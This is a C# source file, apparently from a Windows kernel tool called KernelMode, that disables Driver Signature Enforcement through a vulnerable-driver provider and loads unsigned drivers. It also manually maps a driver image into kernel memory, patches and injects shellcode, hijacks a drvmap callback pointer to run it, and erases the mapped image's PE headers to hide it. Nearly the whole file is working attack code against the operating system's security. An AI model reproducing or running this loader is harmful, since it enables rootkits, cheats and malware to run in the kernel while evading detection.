// File: Driver/DriverLoader.cs
// Project: KernelMode

using KernelMode.Providers;
using KernelMode.Utils;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Messaging;
using System.Text;
using System.Xml.Linq;

namespace KernelMode.Driver
{
	public static class DriverLoader
	{
		private const string DrvMapService = "drvmap";
		// Assuming the program runs from the KDU root, paths are relative to the /bin folder.
		private const string DrvMapPath = @"Drivers\drvmap.sys";
		private const string ShellcodePath = @"Shellcode\scv2.bin";

		private static KernelExportResolver _kernelExportResolver;

		private struct MappedImageInfo
		{
			public ulong BaseAddress;
			public ulong EntryPoint;
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct SYSTEM_MODULE_INFORMATION
		{
			public uint NextOffset;
			public IntPtr Reserved1;
			public IntPtr Reserved2;
			public IntPtr ImageBase;
			public uint ImageSize;
			public uint Flags;
			public ushort LoadOrderIndex;
			public ushort InitOrderIndex;
			public ushort LoadCount;
			public ushort ModuleNameOffset;
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
			public byte[] FullPathName;
		}

		public static void LoadUnsignedDriver()
		{
			IProvider provider = KernelMemory.GetProvider();
			if (provider == null)
			{
				Console.WriteLine("[-] No active provider. DSE patching requires an active provider.");
				return;
			}

			Console.Write("Enter path to unsigned .sys driver to load: ");
			string driverPath = Console.ReadLine();
			if (!File.Exists(driverPath))
			{
				Console.WriteLine("[-] Driver file not found.");
				return;
			}

			string serviceName = Path.GetFileNameWithoutExtension(driverPath);

			if (!DsePatcher.Disable(provider))
			{
				Console.WriteLine("[-] Failed to disable DSE. Cannot load driver.");
				return;
			}

			Console.WriteLine($"[*] Attempting to load driver: {driverPath}");
			if (InstallDriver(serviceName, driverPath))
			{
				Console.WriteLine("[+] Driver service created and started successfully.");
				Console.WriteLine("[*] You can now interact with your driver.");
				Console.WriteLine("[*] Press any key to stop and unload the driver.");
				Console.ReadKey();
				UnloadDriver(serviceName);
				Console.WriteLine("[+] Driver unloaded.");
			}
			else
			{
				Console.WriteLine("[-] Failed to install or start the driver service.");
			}

			// Always attempt to restore DSE.
			DsePatcher.Enable(provider);
		}

		public static void LoadMappedBin()
		{
			Console.Write("Enter path to .bin driver to map (e.g. Drivers/gdrv.bin): ");
			string binPath = Console.ReadLine();
			if (!File.Exists(binPath))
			{
				Console.WriteLine("[-] .bin file not found.");
				return;
			}

			if (!InstallDriver(DrvMapService, DrvMapPath))
			{
				Console.WriteLine("[-] Failed to install drvmap.sys");
				return;
			}

			byte[] shellcode = File.ReadAllBytes(ShellcodePath);
			byte[] targetDriver = File.ReadAllBytes(binPath);

			IProvider provider = KernelMemory.GetProvider();
			if (provider == null)
			{
				Console.WriteLine("[-] No active provider.");
				UnloadDriver(DrvMapService);
				return;
			}

			if (!InitializeKernelExportResolver())
			{
				Console.WriteLine("[-] Failed to initialize kernel export resolver.");
				UnloadDriver(DrvMapService);
				return;
			}

			ulong shellcodeAddr = AllocateAndWrite(provider, shellcode);
			MappedImageInfo driverInfo = MapPEImage(provider, targetDriver);

			if (shellcodeAddr == 0 || driverInfo.BaseAddress == 0)
			{
				Console.WriteLine("[-] Failed to write shellcode or driver.");
				UnloadDriver(DrvMapService);
				return;
			}

			Console.WriteLine("[*] Shellcode written to: 0x" + shellcodeAddr.ToString("X"));
			Console.WriteLine("[*] Driver image written to: 0x" + driverInfo.BaseAddress.ToString("X"));
			Console.WriteLine("[*] Driver entry point at: 0x" + driverInfo.EntryPoint.ToString("X"));

			PatchShellcode(provider, shellcodeAddr, driverInfo.BaseAddress, driverInfo.EntryPoint);

			ulong drvmapBase = ResolveDrvMapBase();
			if (drvmapBase == 0)
			{
				Console.WriteLine("[-] Failed to locate drvmap.sys base address.");
				UnloadDriver(DrvMapService);
				return;
			}

			ulong callbackPointerAddr = drvmapBase + 0x3000; // known offset from symbol analysis
			TriggerDrvMap(provider, shellcodeAddr, callbackPointerAddr);

			Console.WriteLine("[+] Mapping attempted via drvmap");

			// Final cleanup
			UnloadDriver(DrvMapService);
			provider.Dispose(); // This should handle unloading the vulnerable driver
			Console.WriteLine("[+] Cleanup complete.");
		}

		public static void TestPEParsingDryRun()
		{
			Console.Write("Enter path to driver to analyze (without loading): ");
			string driverPath = Console.ReadLine();
			if (!File.Exists(driverPath))
			{
				Console.WriteLine("[-] Driver file not found.");
				return;
			}
			
			byte[] driverImage = File.ReadAllBytes(driverPath);
			Console.WriteLine($"[*] Loaded driver file: {driverPath} ({driverImage.Length} bytes)");
			
			const ushort IMAGE_DOS_SIGNATURE = 0x5A4D;
			const uint IMAGE_NT_SIGNATURE = 0x00004550;
			
			// Verify DOS header
			ushort dosSig = BitConverter.ToUInt16(driverImage, 0);
			if (dosSig != IMAGE_DOS_SIGNATURE)
			{
				Console.WriteLine("[-] Invalid DOS signature.");
				return;
			}
			Console.WriteLine("[+] Valid DOS signature (MZ)");
			
			// Verify PE header
			int peHeaderOffset = BitConverter.ToInt32(driverImage, 0x3C);
			Console.WriteLine($"[*] PE header offset: 0x{peHeaderOffset:X}");
			
			uint ntSig = BitConverter.ToUInt32(driverImage, peHeaderOffset);
			if (ntSig != IMAGE_NT_SIGNATURE)
			{
				Console.WriteLine("[-] Invalid NT signature.");
				return;
			}
			Console.WriteLine("[+] Valid NT signature (PE)");
			
			// Display header info
			short machine = BitConverter.ToInt16(driverImage, peHeaderOffset + 4);
			Console.WriteLine($"[*] Machine: 0x{machine:X4} ({(machine == 0x8664 ? "x64" : "x86")})");
			
			short numberOfSections = BitConverter.ToInt16(driverImage, peHeaderOffset + 6);
			Console.WriteLine($"[*] Number of sections: {numberOfSections}");
			
			int timeStamp = BitConverter.ToInt32(driverImage, peHeaderOffset + 8);
			DateTime compiledTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds(timeStamp);
			Console.WriteLine($"[*] Timestamp: {compiledTime} UTC");
			
			int optionalHeaderOffset = peHeaderOffset + 24;
			int sizeOfOptionalHeader = BitConverter.ToInt16(driverImage, peHeaderOffset + 20);
			Console.WriteLine($"[*] Optional header size: 0x{sizeOfOptionalHeader:X}");
			
			short characteristics = BitConverter.ToInt16(driverImage, peHeaderOffset + 22);
			bool isDll = (characteristics & 0x2000) != 0;
			Console.WriteLine($"[*] File characteristics: 0x{characteristics:X4} ({(isDll ? "DLL" : "EXE")})");
			
			short optionalMagic = BitConverter.ToInt16(driverImage, optionalHeaderOffset);
			Console.WriteLine($"[*] Optional header magic: 0x{optionalMagic:X4} ({(optionalMagic == 0x20b ? "PE32+" : "PE32")})");
			
			ulong imageBase = BitConverter.ToUInt64(driverImage, optionalHeaderOffset + 24);
			Console.WriteLine($"[*] Preferred image base: 0x{imageBase:X}");
			
			int sizeOfImage = BitConverter.ToInt32(driverImage, optionalHeaderOffset + 56);
			Console.WriteLine($"[*] Size of image: 0x{sizeOfImage:X} bytes");
			
			int entryPointRva = BitConverter.ToInt32(driverImage, optionalHeaderOffset + 16);
			Console.WriteLine($"[*] Entry point RVA: 0x{entryPointRva:X}");
			
			// List sections
			int sectionTableOffset = optionalHeaderOffset + sizeOfOptionalHeader;
			Console.WriteLine("\n[*] Section Table:");
			Console.WriteLine("     Name    VirtAddr  VirtSize  RawAddr   RawSize   Chars");
			Console.WriteLine("     ------  --------  --------  --------  --------  --------");
			
			for (int i = 0; i < numberOfSections; i++)
			{
				int entry = sectionTableOffset + (i * 40);
				byte[] nameBytes = new byte[8];
				Buffer.BlockCopy(driverImage, entry, nameBytes, 0, 8);
				string name = Encoding.ASCII.GetString(nameBytes).TrimEnd('\0');
				
				int virtAddr = BitConverter.ToInt32(driverImage, entry + 12);
				int virtSize = BitConverter.ToInt32(driverImage, entry + 8);
				int rawAddr = BitConverter.ToInt32(driverImage, entry + 20);
				int rawSize = BitConverter.ToInt32(driverImage, entry + 16);
				int chars = BitConverter.ToInt32(driverImage, entry + 36);
				
				Console.WriteLine($"     {name,-8}  {virtAddr:X8}  {virtSize:X8}  {rawAddr:X8}  {rawSize:X8}  {chars:X8}");
			}
			
			// Print imports
			const int IMAGE_DIRECTORY_ENTRY_IMPORT = 1;
			int dirBase = optionalHeaderOffset + 112 + (IMAGE_DIRECTORY_ENTRY_IMPORT * 8);
			int importRva = BitConverter.ToInt32(driverImage, dirBase);
			if (importRva != 0)
			{
				Console.WriteLine("\n[*] Import Directory:");
				int importOff = RvaToOffset(driverImage, importRva);
				
				int descIndex = 0;
				while (true)
				{
					int originalFirstThunk = BitConverter.ToInt32(driverImage, importOff);
					int nameRva = BitConverter.ToInt32(driverImage, importOff + 12);
					int firstThunk = BitConverter.ToInt32(driverImage, importOff + 16);
					
					if (originalFirstThunk == 0 && nameRva == 0 && firstThunk == 0)
						break;
					
					int nameOff = RvaToOffset(driverImage, nameRva);
					string dllName = ReadNullTerminatedString(driverImage, nameOff);
					Console.WriteLine($"     #{descIndex}: {dllName}");
					
					// Parse imports from this DLL
					int thunkRva = firstThunk;
					int thunkOff = RvaToOffset(driverImage, originalFirstThunk != 0 ? originalFirstThunk : firstThunk);
					int funcIndex = 0;
					
					while (true)
					{
						ulong thunkData = optionalMagic == 0x20b 
							? BitConverter.ToUInt64(driverImage, thunkOff) 
							: BitConverter.ToUInt32(driverImage, thunkOff);
						
						if (thunkData == 0) break;
						
						if ((thunkData & (optionalMagic == 0x20b ? 0x8000000000000000UL : 0x80000000)) != 0)
						{
							ushort ordinal = (ushort)(thunkData & 0xFFFF);
							Console.WriteLine($"         #{funcIndex}: Ordinal {ordinal}");
						}
						else
						{
							int importByNameRva = (int)(thunkData & 0xFFFFFFFF);
							int hintNameOff = RvaToOffset(driverImage, importByNameRva + 2);
							string funcName = ReadNullTerminatedString(driverImage, hintNameOff);
							Console.WriteLine($"         #{funcIndex}: {funcName}");
						}
						
						thunkOff += (optionalMagic == 0x20b ? 8 : 4);
						funcIndex++;
					}
					
					importOff += 20;
					descIndex++;
				}
			}
			
			Console.WriteLine("\n[+] Driver analysis complete.");
		}

		private static bool InstallDriver(string serviceName, string driverPath)
		{
			if (!File.Exists(driverPath))
			{
				Console.WriteLine($"[-] Driver file not found: {driverPath}");
				return false;
			}
			
			// Stop and delete service if it already exists
			UnloadDriver(serviceName, false);  // Silent mode for cleanup
			
			string fullPath = Path.GetFullPath(driverPath);
			Console.WriteLine($"[*] Creating service {serviceName} with driver: {fullPath}");
			
			try
			{
				using (var process = Process.Start(new ProcessStartInfo
				{
					FileName = "sc",
					Arguments = $"create {serviceName} type= kernel binPath= \"{fullPath}\" start= demand",
					UseShellExecute = false,
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					CreateNoWindow = true
				}))
				{
					process.WaitForExit(5000); // 5 second timeout
					if (process.ExitCode != 0)
					{
						Console.WriteLine($"[-] Failed to create service. Exit code: {process.ExitCode}");
						string output = process.StandardOutput.ReadToEnd();
						if (!string.IsNullOrEmpty(output))
							Console.WriteLine(output);
						return false;
					}
				}
				
				Console.WriteLine("[*] Starting service...");
				using (var process = Process.Start(new ProcessStartInfo
				{
					FileName = "sc",
					Arguments = $"start {serviceName}",
					UseShellExecute = false,
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					CreateNoWindow = true
				}))
				{
					process.WaitForExit(5000); // 5 second timeout					
					
					// Exit code 0 means success, 1077 usually means "service already started"
					if (process.ExitCode != 0 && process.ExitCode != 1077)
					{
						Console.WriteLine($"[-] Failed to start service. Exit code: {process.ExitCode}");
						string output = process.StandardOutput.ReadToEnd();
						if (!string.IsNullOrEmpty(output))
							Console.WriteLine(output);
						
						// Cleanup on failure
						Process.Start("sc", $"delete {serviceName}").WaitForExit();
						return false;
					}
				}
				
				return true;
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[-] Error installing driver: {ex.Message}");
				return false;
			}
		}

		private static void UnloadDriver(string serviceName, bool verbose = true)
		{
			if (verbose)
				Console.WriteLine($"[*] Unloading driver service: {serviceName}");
			
			try
			{
				// Stop the service
				using (var process = Process.Start(new ProcessStartInfo
				{
					FileName = "sc",
					Arguments = $"stop {serviceName}",
					UseShellExecute = false,
					RedirectStandardOutput = true,
					CreateNoWindow = true
				}))
				{
					process.WaitForExit(10000); // 10 second timeout
					// We don't check exit code here because the service might not be running
				}
				
				// Delete the service
				using (var process = Process.Start(new ProcessStartInfo
				{
					FileName = "sc",
					Arguments = $"delete {serviceName}",
					UseShellExecute = false,
					RedirectStandardOutput = true,
					CreateNoWindow = true
				}))
				{
					process.WaitForExit(5000);
					if (process.ExitCode != 0 && verbose)
					{
						Console.WriteLine($"[-] Warning: Failed to delete service {serviceName}. Exit code: {process.ExitCode}");
					}
				}
			}
			catch (Exception ex)
			{
				if (verbose)
					Console.WriteLine($"[-] Error unloading driver: {ex.Message}");
			}
		}

		private static MappedImageInfo MapPEImage(IProvider provider, byte[] image)
		{
			var result = new MappedImageInfo();
			const ushort IMAGE_DOS_SIGNATURE = 0x5A4D;
			const uint IMAGE_NT_SIGNATURE = 0x00004550;
            const ushort PE32_PLUS_MAGIC = 0x20b;

			ushort dosSig = BitConverter.ToUInt16(image, 0);
			if (dosSig != IMAGE_DOS_SIGNATURE)
			{
				Console.WriteLine("[-] Invalid DOS signature.");
				return result;
			}

			int peHeaderOffset = BitConverter.ToInt32(image, 0x3C);
			uint ntSig = BitConverter.ToUInt32(image, peHeaderOffset);
			if (ntSig != IMAGE_NT_SIGNATURE)
			{
				Console.WriteLine("[-] Invalid NT signature.");
				return result;
			}

			int optionalHeaderOffset = peHeaderOffset + 24;
            // Explicitly check for 64-bit PE file (PE32+).
            short optionalMagic = BitConverter.ToInt16(image, optionalHeaderOffset);
            if (optionalMagic != PE32_PLUS_MAGIC)
            {
                Console.WriteLine("[-] Invalid or unsupported PE format. This tool only supports 64-bit drivers.");
                return result;
            }

			short numberOfSections = BitConverter.ToInt16(image, peHeaderOffset + 6);
			int sizeOfOptionalHeader = BitConverter.ToInt16(image, peHeaderOffset + 20);
			int sectionTableOffset = optionalHeaderOffset + sizeOfOptionalHeader;
			ulong imageBase = BitConverter.ToUInt64(image, optionalHeaderOffset + 24);
			int sizeOfImage = BitConverter.ToInt32(image, optionalHeaderOffset + 56);
			int entryPointRva = BitConverter.ToInt32(image, optionalHeaderOffset + 16);
			int sizeOfHeaders = BitConverter.ToInt32(image, optionalHeaderOffset + 60);

			byte[] fullImage = new byte[sizeOfImage];
			Buffer.BlockCopy(image, 0, fullImage, 0, Math.Min(image.Length, sizeOfImage));

			for (int i = 0; i < numberOfSections; i++)
			{
				int entry = sectionTableOffset + (i * 40);
				int rawSize = BitConverter.ToInt32(image, entry + 16);
				int rawPointer = BitConverter.ToInt32(image, entry + 20);
				int virtAddr = BitConverter.ToInt32(image, entry + 12);
				int virtSize = BitConverter.ToInt32(image, entry + 8);

				if (rawSize > 0 && rawPointer > 0)
				{
					Buffer.BlockCopy(image, rawPointer, fullImage, virtAddr, Math.Min(rawSize, virtSize));
				}
			}

			ulong baseAddr = 0xFFFF800000000000;
			for (ulong addr = baseAddr; addr < baseAddr + 0x10000000; addr += 0x1000)
			{
				if (provider.WriteMemory(addr, fullImage, fullImage.Length))
				{
					Console.WriteLine("[+] PE image mapped at 0x" + addr.ToString("X"));
					result.BaseAddress = addr;
					result.EntryPoint = addr + (ulong)entryPointRva;
					ApplyRelocations(image, fullImage, imageBase, addr);
					ApplyImportTable(image, fullImage);
					ErasePEHeaders(provider, addr, (uint)sizeOfHeaders);
					return result;
				}
			}

			Console.WriteLine("[-] Failed to map PE image.");
			return result;
		}

		private static void ErasePEHeaders(IProvider provider, ulong imageBase, uint sizeOfHeaders)
		{
			Console.WriteLine("[*] Erasing PE headers from mapped driver...");
			byte[] zeros = new byte[sizeOfHeaders];
			if (!provider.WriteMemory(imageBase, zeros, zeros.Length))
			{
				Console.WriteLine("[-] Failed to erase PE headers.");
			}
			else
			{
				Console.WriteLine("[+] PE headers erased.");
			}
		}

		private static void ApplyRelocations(byte[] originalImage, byte[] mappedImage, ulong originalBase, ulong newBase)
		{
			const int IMAGE_DIRECTORY_ENTRY_BASERELOC = 5;
			int peHeaderOffset = BitConverter.ToInt32(originalImage, 0x3C);

			// DataDirectory[5]
			int dirBase = peHeaderOffset + 24 + 112 + (IMAGE_DIRECTORY_ENTRY_BASERELOC * 8);
			int relocRva = BitConverter.ToInt32(originalImage, dirBase + 0);
			int relocSize = BitConverter.ToInt32(originalImage, dirBase + 4);
			if (relocRva == 0 || relocSize == 0) return;

			// Relocation data is in file; iterate via file mapping (RvaToOffset correct for reading the blocks)
			int fileOffset = RvaToOffset(originalImage, relocRva);
			ulong delta = newBase - originalBase;
			int end = fileOffset + relocSize;

			while (fileOffset < end)
			{
				int pageRva = BitConverter.ToInt32(originalImage, fileOffset + 0);
				int blockSize = BitConverter.ToInt32(originalImage, fileOffset + 4);
				int entryCount = (blockSize - 8) / 2;

				for (int i = 0; i < entryCount; i++)
				{
					ushort entry = BitConverter.ToUInt16(originalImage, fileOffset + 8 + i * 2);
					int type = (entry >> 12) & 0xF;
					int rvaOffset = entry & 0xFFF;
					if (type == 0 /* IMAGE_REL_BASED_ABSOLUTE */) continue;
					if (type != 10 /* IMAGE_REL_BASED_DIR64 */) continue;

					int targetRva = pageRva + rvaOffset;
					// mappedImage is RVA-indexed, so write directly at RVA
					ulong origValue = BitConverter.ToUInt64(mappedImage, targetRva);
					ulong newValue = origValue + delta;
					Buffer.BlockCopy(BitConverter.GetBytes(newValue), 0, mappedImage, targetRva, 8);
				}

				fileOffset += blockSize;
			}
		}

		private static void ApplyImportTable(byte[] originalImage, byte[] mappedImage)
		{
			const int IMAGE_DIRECTORY_ENTRY_IMPORT = 1;
			int peHeaderOffset = BitConverter.ToInt32(originalImage, 0x3C);
			int dirBase = peHeaderOffset + 24 + 112 + (IMAGE_DIRECTORY_ENTRY_IMPORT * 8);
			int importRva = BitConverter.ToInt32(originalImage, dirBase + 0);
			if (importRva == 0) return;

			// Walk IMAGE_IMPORT_DESCRIPTORs using file offsets for reading metadata
			int descOff = RvaToOffset(originalImage, importRva);
			while (true)
			{
				int originalFirstThunk = BitConverter.ToInt32(originalImage, descOff + 0);
				int timeDateStamp      = BitConverter.ToInt32(originalImage, descOff + 4);
				int forwarderChain     = BitConverter.ToInt32(originalImage, descOff + 8);
				int nameRva            = BitConverter.ToInt32(originalImage, descOff + 12);
				int firstThunkRva      = BitConverter.ToInt32(originalImage, descOff + 16);
				if (originalFirstThunk == 0 && nameRva == 0 && firstThunkRva == 0)
					break;

				// Read DLL name (from file image)
				int nameOff = RvaToOffset(originalImage, nameRva);
				string dllName = ReadNullTerminatedString(originalImage, nameOff);
				Console.WriteLine("[*] Import DLL: " + dllName);

				// Walk INT/IAT via RVAs; Read names from file image; Write addresses to mapped image (RVA space)
				int thunkRva = firstThunkRva;
				while (true)
				{
					ulong thunkData = BitConverter.ToUInt64(mappedImage, thunkRva); // read from mapped (RVA-based)
					if (thunkData == 0) break;

					// Ordinal?
					if ((thunkData & 0x8000000000000000UL) != 0)
					{
						ushort ordinal = (ushort)(thunkData & 0xFFFF);
						// TODO: resolve by ordinal if needed
					}
					else
					{
						int importByNameRva = (int)(thunkData & 0xFFFFFFFF);
						int hintNameOff = RvaToOffset(originalImage, importByNameRva + 2); // skip hint
						string funcName = ReadNullTerminatedString(originalImage, hintNameOff);
						Console.WriteLine($"    - {funcName}");

						ulong resolved = ResolveKernelExport(funcName);
						if (resolved == 0)
							Console.WriteLine($"[-] Failed to resolve import: {funcName}");

						Buffer.BlockCopy(BitConverter.GetBytes(resolved), 0, mappedImage, thunkRva, 8);
					}
					thunkRva += 8;
				}

				descOff += 20; // sizeof(IMAGE_IMPORT_DESCRIPTOR)
			}
		}

		private static string ReadNullTerminatedString(byte[] buffer, int offset)
		{
			int end = Array.IndexOf(buffer, (byte)0, offset);
			if (end == -1) end = buffer.Length;
			return Encoding.ASCII.GetString(buffer, offset, end - offset);
		}

		private static bool InitializeKernelExportResolver()
		{
			string ntoskrnlPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "ntoskrnl.exe");
			if (!File.Exists(ntoskrnlPath))
			{
				Console.WriteLine("[-] ntoskrnl.exe not found in System32.");
				return false;
			}

			byte[] ntoskrnlImage = File.ReadAllBytes(ntoskrnlPath);
			ulong ntoskrnlBase = GetNtoskrnlBase();
			if (ntoskrnlBase == 0)
			{
				Console.WriteLine("[-] Failed to get ntoskrnl.exe base address.");
				return false;
			}

			_kernelExportResolver = new KernelExportResolver(ntoskrnlImage, ntoskrnlBase);
			return true;
		}

		private static ulong ResolveKernelExport(string name)
		{
			if (_kernelExportResolver == null)
			{
				Console.WriteLine("[!] Kernel export resolver not initialized.");
				return 0;
			}
			return _kernelExportResolver.Resolve(name);
		}

		private static void PatchShellcode(IProvider provider, ulong shellcodeAddr, ulong driverBase, ulong driverEntry)
		{
			// Patches the shellcode (e.g., scv2.bin) with the necessary addresses.
			// The shellcode expects the driver base address in RCX and the entry point in RAX.
			// From ScV2.cs:
			// offset 6: mov rcx, <param> (driverBase)
			// offset 16: mov rax, <DriverEntry>

			byte[] basePatch = BitConverter.GetBytes(driverBase);
			if (!provider.WriteMemory(shellcodeAddr + 6, basePatch, basePatch.Length))
			{
				Console.WriteLine("[-] Failed to patch shellcode with driver base address.");
			}

			byte[] entryPatch = BitConverter.GetBytes(driverEntry);
			if (!provider.WriteMemory(shellcodeAddr + 16, entryPatch, entryPatch.Length))
			{
				Console.WriteLine("[-] Failed to patch shellcode with driver entry point.");
			}
		}

		public static bool TryQuerySystemModules(out IntPtr buffer, out int moduleCount, out int entrySize)
		{
			buffer = IntPtr.Zero;
			moduleCount = 0;
			entrySize = Marshal.SizeOf(typeof(SYSTEM_MODULE_INFORMATION));

			const int SystemModuleInformation = 11;
			int length = 0;
			NativeMethods.NtQuerySystemInformation(SystemModuleInformation, IntPtr.Zero, 0, out length);
			if (length == 0) return false;

			buffer = Marshal.AllocHGlobal(length);
			if (NativeMethods.NtQuerySystemInformation(SystemModuleInformation, buffer, length, out _) != 0)
			{
				Marshal.FreeHGlobal(buffer);
				buffer = IntPtr.Zero;
				return false;
			}

			// NumberOfModules (ULONG) at offset 0
			moduleCount = Marshal.ReadInt32(buffer);
			return true;
		}

		private static ulong GetNtoskrnlBase()
		{
			if (!TryQuerySystemModules(out var buffer, out var count, out var entrySize))
				return 0;

			try
			{
				// Entries start after 4-byte NumberOfModules
				IntPtr current = new IntPtr(buffer.ToInt64() + 4);
				for (int i = 0; i < count; i++)
				{
					var entry = Marshal.PtrToStructure<SYSTEM_MODULE_INFORMATION>(current);
					string name = Encoding.ASCII.GetString(entry.FullPathName).TrimEnd('\0').ToLowerInvariant();
					if (name.EndsWith("\\ntoskrnl.exe") || name.EndsWith("/ntoskrnl.exe") || name.Contains("ntoskrnl.exe"))
					{
						return (ulong)entry.ImageBase.ToInt64();
					}
					current = new IntPtr(current.ToInt64() + entrySize);
				}
				return 0;
			}
			finally
			{
				Marshal.FreeHGlobal(buffer);
			}
		}

		private static ulong ResolveDrvMapBase()
		{
			if (!TryQuerySystemModules(out var buffer, out var count, out var entrySize))
				return 0;

			try
			{
				IntPtr current = new IntPtr(buffer.ToInt64() + 4);
				for (int i = 0; i < count; i++)
				{
					var entry = Marshal.PtrToStructure<SYSTEM_MODULE_INFORMATION>(current);
					string name = Encoding.ASCII.GetString(entry.FullPathName).TrimEnd('\0').ToLowerInvariant();
					if (name.Contains("drvmap"))
						return (ulong)entry.ImageBase.ToInt64();

					current = new IntPtr(current.ToInt64() + entrySize);
				}
				return 0;
			}
			finally
			{
				Marshal.FreeHGlobal(buffer);
			}
		}

		static void TriggerDrvMap(IProvider provider, ulong shellcodeAddr, ulong callbackPointerAddr)
		{
			byte[] ptrBytes = BitConverter.GetBytes(shellcodeAddr);

			if (!provider.WriteMemory(callbackPointerAddr, ptrBytes, ptrBytes.Length))
			{
				Console.WriteLine("[-] Failed to write shellcode pointer to drvmap.");
				return;
			}

			Console.WriteLine("[*] Shellcode address written to drvmap global pointer.");
			TriggerExecution();
		}

		static void TriggerExecution()
		{
			try
			{
				using (var device = NativeMethods.CreateFile("\\\\.\\DRVMAP",
					NativeMethods.GENERIC_READ | NativeMethods.GENERIC_WRITE,
					0, IntPtr.Zero, NativeMethods.OPEN_EXISTING, 0, IntPtr.Zero))
				{
					if (device.IsInvalid)
					{
						Console.WriteLine("[-] Failed to open drvmap device.");
						return;
					}

					int ret;
					NativeMethods.DeviceIoControl(device, 0x222003, IntPtr.Zero, 0, IntPtr.Zero, 0, out ret, IntPtr.Zero);
					Console.WriteLine("[+] Triggered drvmap execution.");
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("[-] Error triggering shellcode: " + ex.Message);
			}
		}
		// Add this method to the DriverLoader class			
		private static ulong AllocateAndWrite(IProvider provider, byte[] data)
		{
			// Try to find a suitable address in kernel memory to write the data
			ulong baseAddr = 0xFFFF800000000000;
			const int chunkSize = 8; // For providers that only support 8-byte writes
			
			for (ulong addr = baseAddr; addr < baseAddr + 0x10000000; addr += 0x1000)
			{
				// Try writing in chunks for providers that don't support large writes
				bool success = true;
				
				// First attempt the full write - more efficient if supported
				if (provider.WriteMemory(addr, data, data.Length))
				{
					return addr;
				}
				
				// If full write fails, try writing in chunks
				for (int offset = 0; offset < data.Length; offset += chunkSize)
				{
					int bytesToWrite = Math.Min(chunkSize, data.Length - offset);
					byte[] chunk = new byte[bytesToWrite];
					Buffer.BlockCopy(data, offset, chunk, 0, bytesToWrite);
					
					if (!provider.WriteMemory(addr + (ulong)offset, chunk, bytesToWrite))
					{
						success = false;
						break;
					}
				}
				
				if (success)
				{
					// Verify the write succeeded by reading it back
					byte[] verification = new byte[data.Length];
					if (provider.ReadMemory(addr, verification, verification.Length))
					{
						for (int i = 0; i < data.Length; i++)
						{
							if (data[i] != verification[i])
							{
								success = false;
								break;
							}
						}
					}
					else
					{
						success = false;
					}
					
					if (success)
					{
						return addr;
					}
				}
			}
			
			return 0;
		}

		private static int RvaToOffset(byte[] image, int rva)
		{
			int peHeaderOffset = BitConverter.ToInt32(image, 0x3C);
			short numberOfSections = BitConverter.ToInt16(image, peHeaderOffset + 6);
			int sizeOfOptionalHeader = BitConverter.ToInt16(image, peHeaderOffset + 20);
			int sectionTableOffset = peHeaderOffset + 24 + sizeOfOptionalHeader;

			for (int i = 0; i < numberOfSections; i++)
			{
				int entry = sectionTableOffset + (i * 40);
				int virtAddr = BitConverter.ToInt32(image, entry + 12);
				int virtSize = BitConverter.ToInt32(image, entry + 8);
				int rawPtr = BitConverter.ToInt32(image, entry + 20);
				int rawSize = BitConverter.ToInt32(image, entry + 16);

				if (rva >= virtAddr && rva < virtAddr + virtSize)
					return rawPtr + (rva - virtAddr);
			}

			// If RVA isn't in any section, it's in the header (which is mapped 1:1)
			return rva;
		}

		private static bool ValidateDriverMapping(MappedImageInfo driverInfo, byte[] image)
		{
			int peHeaderOffset = BitConverter.ToInt32(image, 0x3C);
			int optionalHeaderOffset = peHeaderOffset + 24;
			int sizeOfImage = BitConverter.ToInt32(image, optionalHeaderOffset + 56);
			
			// Verify entry point is reasonable (non-zero and within image)
			if (driverInfo.EntryPoint < driverInfo.BaseAddress || 
				driverInfo.EntryPoint >= driverInfo.BaseAddress + (ulong)sizeOfImage)
			{
				Console.WriteLine("[-] Warning: Driver entry point appears invalid.");
				return false;
			}
			
			// Get Windows build number for diagnostic info
			int buildNumber = Environment.OSVersion.Version.Build;
			Console.WriteLine($"[*] Windows Build: {buildNumber}");
			
			return true;
		}

        public static SYSTEM_MODULE_INFORMATION GetKernelModule(string moduleName)
        {
            if (!TryQuerySystemModules(out IntPtr buffer, out int count, out int entrySize))
                return new SYSTEM_MODULE_INFORMATION();

            var result = new SYSTEM_MODULE_INFORMATION();
            try
            {
                IntPtr current = new IntPtr(buffer.ToInt64() + 4); // Skip the ULONG module count
                for (int i = 0; i < count; i++)
                {
                    var entry = (SYSTEM_MODULE_INFORMATION)Marshal.PtrToStructure(current, typeof(SYSTEM_MODULE_INFORMATION));
                    string name = Encoding.ASCII.GetString(entry.FullPathName).TrimEnd('\0').ToLowerInvariant();

                    if (name.EndsWith($"\\{moduleName.ToLowerInvariant()}"))
                    {
                        result = entry;
                        break;
                    }
                    current = new IntPtr(current.ToInt64() + entrySize);
                }
            }
            finally
            {
                if (buffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(buffer);
            }
            return result;
        }
    }
}
